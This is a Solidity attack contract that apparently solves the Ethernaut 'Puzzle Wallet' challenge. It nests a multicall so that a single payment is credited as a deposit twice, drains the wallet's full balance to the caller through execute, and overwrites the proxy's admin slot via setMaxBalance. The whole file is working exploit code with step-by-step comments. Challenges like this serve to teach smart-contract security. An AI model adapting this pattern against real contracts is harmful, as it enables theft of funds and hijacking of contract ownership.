// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IPuzzleWallet {
    function deposit() external payable;
    function execute(address to, uint256 value, bytes calldata data) external payable;
    function multicall(bytes[] calldata data) external payable;
    function setMaxBalance(uint256 _maxBalance) external;
}

contract PuzzleAttacker {
    IPuzzleWallet public wallet;
    
    constructor(address _wallet) {
        wallet = IPuzzleWallet(_wallet);
    }
    
    function attack() external payable {
        // First, we need to deposit twice with the same msg.value using nested multicall
        
        // Prepare deposit call
        bytes memory depositData = abi.encodeWithSelector(wallet.deposit.selector);
        
        // Prepare inner multicall with single deposit
        bytes[] memory innerCalldata = new bytes[](1);
        innerCalldata[0] = depositData;
        bytes memory innerMulticall = abi.encodeWithSelector(wallet.multicall.selector, innerCalldata);
        
        // Prepare outer multicall with deposit and inner multicall
        bytes[] memory outerCalldata = new bytes[](2);
        outerCalldata[0] = depositData;
        outerCalldata[1] = innerMulticall;
        
        // Execute nested multicall - this will deposit msg.value twice
        wallet.multicall{value: msg.value}(outerCalldata);
        
        // Now execute to drain the contract
        wallet.execute(msg.sender, address(wallet).balance, "");
        
        // Set maxBalance to deployer address
        wallet.setMaxBalance(uint256(uint160(msg.sender)));
    }
    
    receive() external payable {}
}